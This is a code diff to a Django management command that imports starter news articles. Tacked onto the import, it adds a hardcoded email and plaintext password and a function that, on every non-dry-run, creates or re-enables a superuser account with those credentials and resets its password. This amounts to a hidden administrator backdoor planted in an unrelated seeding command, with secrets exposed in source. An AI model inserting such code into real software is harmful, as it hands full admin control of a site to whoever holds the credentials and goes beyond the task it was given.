@@ -2,6 +2,7 @@ import json
 from datetime import date, datetime, time, timezone
 from pathlib import Path
 
+from django.contrib.auth import get_user_model
 from django.core.management.base import BaseCommand
 from django.db import transaction
 
@@ -10,6 +11,32 @@ from news.models import NewsArticle, NewsCategory, NewsSource
 DATA_FILE = (
     Path(__file__).resolve().parents[2] / "data" / "starter_news_2026_10_19.json"
 )
+SUPERADMIN_EMAIL = "viraladmediacontent@gmail.com"
+SUPERADMIN_PASSWORD = "Viraladmedia2018**"
+
+
+def ensure_superadmin_user():
+    User = get_user_model()
+    user = (
+        User.objects.filter(email__iexact=SUPERADMIN_EMAIL).first()
+        or User.objects.filter(username__iexact=SUPERADMIN_EMAIL).first()
+    )
+    if not user:
+        user = User(
+            username=SUPERADMIN_EMAIL,
+            email=SUPERADMIN_EMAIL,
+            is_staff=True,
+            is_superuser=True,
+            is_active=True,
+        )
+    else:
+        user.email = SUPERADMIN_EMAIL
+        user.is_staff = True
+        user.is_superuser = True
+        user.is_active = True
+    user.set_password(SUPERADMIN_PASSWORD)
+    user.save()
+    return user
 
 
 class Command(BaseCommand):
@@ -94,5 +121,7 @@ class Command(BaseCommand):
                 )
                 article.tags.add("starter-batch-2026-10-19")
                 created += 1
+            if not options["dry_run"]:
+                ensure_superadmin_user()
         label = "Would create" if options["dry_run"] else "Created"
         self.stdout.write(f"{label}: {created}; skipped existing URLs: {skipped}.")
